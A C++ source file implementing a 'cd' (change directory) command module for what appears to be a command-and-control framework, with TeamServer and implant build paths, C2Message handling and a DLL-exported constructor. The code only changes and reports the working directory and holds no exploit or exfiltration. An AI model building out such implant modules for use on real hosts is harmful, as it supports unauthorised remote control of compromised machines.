#include "ChangeDirectory.hpp"

#include "Common.hpp"

#include <cstring>
#include <array>
#include <filesystem>

using namespace std;


constexpr std::string_view moduleName = "cd";
constexpr unsigned long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) ChangeDirectory* ChangeDirectoryConstructor() 
{
    return new ChangeDirectory();
}

#endif

ChangeDirectory::ChangeDirectory()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
}

ChangeDirectory::~ChangeDirectory()
{
}

std::string ChangeDirectory::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "cd:\n";
	info += "ChangeDirectory\n";
	info += "exemple:\n";
	info += "- cd /tmp\n";
#endif
	return info;
}

int ChangeDirectory::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
    string path;
    for (int idx = 1; idx < splitedCmd.size(); idx++) 
    {
        if(!path.empty())
            path+=" ";
        path+=splitedCmd[idx];
    }

	c2Message.set_instruction(splitedCmd[0]);
	c2Message.set_cmd(path);
#endif
	return 0;
}


int ChangeDirectory::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	string path = c2Message.cmd();
	std::string outCmd = changeDirectory(path);

	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd(path);
	c2RetMessage.set_returnvalue(outCmd);

	return 0;
}


std::string ChangeDirectory::changeDirectory(const std::string& path)
{
	std::error_code ec;
    try
    {
        if(!path.empty())
            std::filesystem::current_path(path, ec); 
    } catch (...) 
    {
    }

    std::string result;
    result=std::filesystem::current_path(ec).string();

	return result;
}